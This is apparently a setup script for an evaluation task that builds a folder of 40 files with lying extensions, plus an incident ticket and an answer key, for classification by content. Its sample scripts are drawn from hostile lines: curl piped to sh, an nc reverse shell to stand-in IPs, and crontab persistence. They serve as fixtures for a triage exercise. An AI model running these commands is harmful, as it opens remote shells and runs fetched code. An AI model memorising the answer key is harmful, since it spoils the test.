#!/bin/bash
# Builds quarantine/ with 40 files whose extensions are random and mostly lies: ELF binaries
# (copies of real system binaries), shell/python/perl scripts (some with CRLF), PNG/JPEG/GIF
# images, plain text (also with .sh or .exe names, and a comment as first line), and gzip /
# bzip2 / xz archives of text, script, ELF or image. Classes: elf, script (starts with #!),
# archive:<inner class>, image, text. Names, classes and extensions are random per setup.
SANDBOX="$1"
cd "$SANDBOX" || exit 1
mkdir -p quarantine .lm-state
cat > TICKET.md <<'T'
# Incident IR-2291: files from the compromised host

The incident team copied 40 files into quarantine/. The file names (and
their extensions) were chosen by the attacker and cannot be trusted. Classify
every file by its CONTENT into types.tsv: `name<TAB>class`, where class is
  elf              a compiled ELF executable or library
  script           text that starts with a #! interpreter line
  image            PNG, JPEG or GIF
  text             any other plain text, including files that only look like scripts
  archive:<class>  a gzip/bzip2/xz compressed file, with the class of what is inside
T
python3 - "$RANDOM$$" <<'PY'
import bz2, gzip, lzma, os, random, shutil, struct, sys, zlib
R = random.Random(int(sys.argv[1]))
def png():
    def ch(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    w = R.randint(1, 4)
    raw = b"".join(b"\x00" + bytes(R.getrandbits(8) for _ in range(3 * w)) for _ in range(w))
    return b"\x89PNG\r\n\x1a\n" + ch(b"IHDR", struct.pack(">IIBBBBB", w, w, 8, 2, 0, 0, 0)) + ch(b"IDAT", zlib.compress(raw)) + ch(b"IEND", b"")
def jpg():
    return (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + bytes(R.getrandbits(8) for _ in range(120)) + b"\xff\xd9")
def gif():
    return b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
def image(): return R.choice([png, jpg, gif])()
def elf():
    src = R.choice(["/usr/bin/true", "/usr/bin/false", "/usr/bin/cat", "/usr/bin/echo", "/usr/bin/sleep", "/usr/bin/wc", "/usr/bin/tr"])
    return open(src, "rb").read()
shebangs = ["#!/bin/sh", "#!/bin/bash", "#!/usr/bin/env python3", "#!/usr/bin/perl", "#!/usr/bin/env bash"]
bodies = ["curl -s http://198.51.100.%d/x | sh", "echo %d > /tmp/.k", "nc -e /bin/sh 203.0.113.%d 4444", "crontab -l | { cat; echo '*/5 * * * * /tmp/.u%d'; } | crontab -",
          "chmod +x /tmp/.x%d && /tmp/.x%d", "import socket; print(%d)", "print(%d)"]
def script():
    s = R.choice(shebangs) + "\n" + "\n".join(R.choice(bodies).replace("%d", str(R.randint(2, 250))) for _ in range(R.randint(2, 4))) + "\n"
    s = s.replace("\n", "\r\n") if R.random() < 0.2 else s
    return s.encode()
texts = ["# nginx access log excerpt\n", "# notes\n", "id,user,bytes\n", "Meeting notes, remember to rotate keys\n", "TODO: clean up the backup share\n", "[main]\nkey = value\n", "# exfil list\n"]
def text():
    t = R.choice(texts) + "".join("line %d %08x\n" % (i, R.getrandbits(32)) for i in range(R.randint(3, 12)))
    if R.random() < 0.15: t += "café résumé\n"
    return t.encode("utf-8")
def archive(inner):
    data = {"text": text, "script": script, "elf": elf, "image": image}[inner]()
    return R.choice([gzip.compress, bz2.compress, lzma.compress])(data)
plan = [("elf", elf)] * 7 + [("script", script)] * 8 + [("image", image)] * 8 + [("text", text)] * 9
plan += [("archive:text", lambda: archive("text"))] * 2 + [("archive:script", lambda: archive("script"))] * 2
plan += [("archive:elf", lambda: archive("elf"))] * 2 + [("archive:image", lambda: archive("image"))] * 2
R.shuffle(plan)
stems = ["invoice", "holiday", "update", "backup", "report", "photo", "setup", "notes", "scan", "readme", "data", "logo", "payload", "driver", "meeting", "budget", "export", "cache", "session", "config",
         "Q3 report", "final (2)", "my photo", "new folder", "run", "svc", "tmp", "img", "archive", "dump", "cv", "salary", "agenda", "keys", "install", "patch", "build", "stats", "mail", "old"]
R.shuffle(stems)
exts = [".jpg", ".png", ".txt", ".sh", ".pdf", ".docx", ".log", ".exe", ".dat", ".zip", ".bak", "", "", ".gif", ".csv", ".py", ".doc"]
# forced lies, then random extensions
forced = {"elf": ".jpg", "archive:text": ".txt", "script": "", "image": ".sh"}
used_forced = set()
out = []
for (cls, make), stem in zip(plan, stems):
    ext = R.choice(exts)
    key = cls if cls in forced else None
    if key and key not in used_forced:
        ext = forced[key]; used_forced.add(key)
    name = stem + ext
    with open("quarantine/" + name, "wb") as f:
        f.write(make())
    os.chmod("quarantine/" + name, R.choice([0o644, 0o755]))
    out.append((name, cls))
with open(".lm-state/expected", "w") as f:
    for name, cls in sorted(out):
        f.write("%s\t%s\n" % (name, cls))
PY
